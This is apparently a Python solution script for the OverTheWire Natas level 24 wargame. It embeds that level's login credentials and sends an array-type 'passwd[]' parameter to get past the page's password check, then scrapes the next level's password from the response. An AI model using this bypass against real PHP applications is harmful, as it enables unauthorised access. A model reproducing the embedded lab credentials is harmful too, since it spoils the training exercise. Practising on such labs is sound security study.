import requests
import re

URL = 'http://natas24.natas.labs.overthewire.org' + '?passwd[]=test'
AUTH = ('natas24', '0xzF30T9Av8lgXhW7slhFCIsVKAPyl2r')


r = requests.get(url=URL, auth=AUTH)
print('password', re.findall(r'Password: (.*?)</pre>', r.text))
